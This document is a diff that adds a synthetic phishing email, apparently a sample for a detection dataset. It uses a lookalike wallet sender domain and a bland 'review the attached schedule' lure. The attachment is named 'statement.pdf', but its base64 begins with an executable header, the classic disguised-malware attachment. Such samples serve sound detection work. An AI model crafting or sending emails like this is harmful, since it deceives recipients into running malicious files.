@@ -1,0 +1,47 @@
+From: notice@coinbase-wallet.top
+To: victim21@example.com
+Subject: Meeting notes for the west power desk [ref A8D8101]
+Date: Tue, 10 Mar 2002 17:48:00 -0500
+Message-ID: <phish-81-ffcfb2a2-149c-4169-97ea-03b243a01b4d@coinbase-wallet.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 04 Mar 2002 14:09:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 10 Mar 2002 23:27:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 28 Mar 2002 20:25:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 09 Mar 2002 00:13:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 04 Mar 2002 22:02:00 -0500
+Return-Path: <notice@coinbase-wallet.top>
+Reply-To: notice@coinbase-wallet.top
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=coinbase-wallet.top; dkim=pass header.d=coinbase-wallet.top; dmarc=pass header.from=coinbase-wallet.top
+Received-SPF: pass (mx.example.com: domain of notice@coinbase-wallet.top designates 192.0.2.21 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=coinbase-wallet.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="bnd-p-81-a1141926"
+
+--bnd-p-81-a1141926
+Content-Type: text/plain; charset="UTF-8"
+
+Hi,
+
+Please review the attached schedule before Friday. No action needed beyond that.
+Reference: A8D8101
+
+Thanks,
+Colleague
+--bnd-p-81-a1141926
+Content-Type: application/pdf; name="statement.pdf"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="statement.pdf"
+
+TVqQAHO9VnsqPEvI2T52WfG1B2vmUqRNopPGpvnArJguHCYxf5ckRSJl9dyXZW68Z6AfGLfxPYIc
+hjeSGSXSbsgCYSrA+AxNaC2Rzv1gc/TBISybP+5zlpWFot23gW0oDsjdZDexup+nAWYSJeZH0Gfa
+oFYg1Wq9FL3KwB/1SUpNRErScPOCQRdufLEMbNfaqmM7WABWMQWMsXl/mEq5CSK8jZAlh7QbB781
+f+DtdvBNPAKhYmsKoMzKfD++NCVRPlpi1fn5ir/Rl0mxA8pa2RLYPe3eq59JDhlGhs3pFAFg91Sw
+wTk0jagOsmNCNNFKzFMEgClNikC48MjhZIMw5BvRhBLsJIap28kKiMGsuu15P9eLcGO9YK+j7js6
+u83g5JqzoHqIuU/wotPAHhO13d4ax4eNwEjP4iFPVk9waeDebiLGCBDR/iw+JpNFyY8bKNynLY8P
++8JpvYfrBX2k9/Ifv59yqCH89zFaoHxddIAWM89jFJ5m5trEvwC9Z0M5pXYVHozNYrOzIA0rJVRS
+nyDR6MP+WbTPMkni011Sn9A2v5UDbVH1aGliJJezdwMpL2lGH/dz4hXyvP0CU9UgyIZDqRbND7LN
+4qIxSlE8rkdKwVOXTEbdetW8U0+HDyoaPSILMgIS5+OqB8h9xbboa9ttfa+h3+qvs66RkcmYD2O5
+CveNBqbgwm5UQ2oEoQ0f5qk++PO9/zYHjb1QK8N25D5RntkX5Z2vRZNvc/v2YkLU0qm4dj5u05aH
+SoTXpsku8PFunW0qGRJeuqujCpJkUDkDAiPCRGwhwdLZB9qEFA4O4aRniP60wY7S7SK+dd8PJ1Dr
+l9eD+7n5RCwkXvjuMg==
+
+--bnd-p-81-a1141926--
